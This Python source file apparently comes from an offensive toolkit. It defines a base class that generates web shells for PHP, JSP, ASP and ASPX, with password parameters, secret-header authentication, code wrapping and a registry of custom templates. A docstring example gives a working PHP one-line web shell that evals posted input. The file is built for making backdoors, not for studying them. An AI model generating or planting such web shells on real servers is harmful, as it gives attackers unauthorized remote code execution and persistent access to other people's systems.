"""
Base class for webshell generation with custom template support.
"""

import logging
from typing import Optional

from ofx.settings import settings

logger = logging.getLogger(settings.app_branding)


class WebShell:
    """Base class for web shell generation"""

    # Class-level custom template registry
    _custom_templates: dict[str, str] = {}

    def __init__(
        self,
        password: str = "pass",
        encoder: str = "default",
        secret_header: Optional[str] = None,
        secret_value: Optional[str] = None,
        prefix: str = "",
        suffix: str = "",
    ):
        """
        Initialize webshell generator.

        Args:
            password: Password parameter name for webshell (default: 'pass')
            encoder: Encoding type - varies by language (default: 'default')
            secret_header: Optional HTTP header name for authentication (e.g., 'X-Auth-Token')
            secret_value: Optional HTTP header value for authentication
            prefix: Code to prepend to webshell
            suffix: Code to append to webshell
        """
        self.password = password
        self.encoder = encoder
        self.secret_header = secret_header
        self.secret_value = secret_value
        self.prefix = prefix
        self.suffix = suffix

    def wrap_code(self, code: str) -> str:
        """Wrap code with prefix and suffix"""
        return f"{self.prefix}{code}{self.suffix}"

    def make_inline(self, code: str) -> str:
        """Remove whitespace for inline usage"""
        code = code.replace("\t", " ")
        code = code.replace("\r", " ")
        code = code.replace("\n", " ")
        # Remove multiple spaces
        while "  " in code:
            code = code.replace("  ", " ")
        return code.strip()

    def apply_template(self, template: str) -> str:
        """
        Apply password and authentication placeholders to template.

        Args:
            template: Template string with placeholders

        Returns:
            Template with placeholders replaced
        """
        code = template.replace("{{PASSWORD}}", self.password)

        # Apply authentication header if configured
        if self.secret_header and self.secret_value:
            code = code.replace(
                "{{SECRET_HEADER}}", self.secret_header.upper().replace("-", "_")
            )
            code = code.replace("{{SECRET_VALUE}}", self.secret_value)

        return code

    @classmethod
    def register_custom_template(cls, language: str, template: str) -> None:
        """
        Register a custom webshell template.

        Args:
            language: Language identifier (php, jsp, asp, aspx)
            template: Webshell code template (use {{PASSWORD}} placeholder)

        Example:
            WebShell.register_custom_template('php', '<?php eval($_POST["{{PASSWORD}}"]);?>')
        """
        key = language.lower()
        cls._custom_templates[key] = template
        logger.info(f"Registered custom webshell template: {key}")

    @classmethod
    def unregister_custom_template(cls, language: str) -> None:
        """Unregister a custom webshell template"""
        key = language.lower()
        if key in cls._custom_templates:
            del cls._custom_templates[key]
            logger.info(f"Unregistered custom webshell template: {key}")

    @classmethod
    def clear_custom_templates(cls) -> None:
        """Clear all custom templates"""
        cls._custom_templates.clear()
        logger.info("Cleared all custom webshell templates")

    @classmethod
    def list_custom_templates(cls) -> list[str]:
        """List all registered custom templates"""
        return list(cls._custom_templates.keys())

    def _get_custom_template(self, language: str) -> Optional[str]:
        """Get custom template if registered"""
        return self._custom_templates.get(language.lower())
